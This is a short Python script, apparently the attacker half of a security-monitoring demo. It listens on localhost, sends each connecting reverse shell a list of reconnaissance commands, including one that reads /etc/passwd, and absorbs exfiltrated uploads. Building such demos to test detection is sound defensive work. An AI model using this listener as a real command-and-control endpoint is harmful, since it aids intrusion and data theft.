"""
Attacker side of the demo (runs OUTSIDE the monitored process tree): listens on 127.0.0.1:PORT, and for every
connection sends a few shell commands (revshell payload) or swallows the uploaded data (exfil payload).

  python3 live/demo/listener.py [port]
"""
import socket, sys, threading

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
COMMANDS = b"id\nuname -a\ncat /etc/passwd\nls -la /tmp\nps aux\nexit\n"

def handle(conn):
    with conn:
        conn.settimeout(5)
        try:
            conn.sendall(COMMANDS)
            while conn.recv(65536): pass
        except OSError:
            pass

srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", PORT)); srv.listen()
print(f"[listener] 127.0.0.1:{PORT}", flush=True)
while True:
    c, _ = srv.accept(); threading.Thread(target=handle, args=(c,), daemon=True).start()
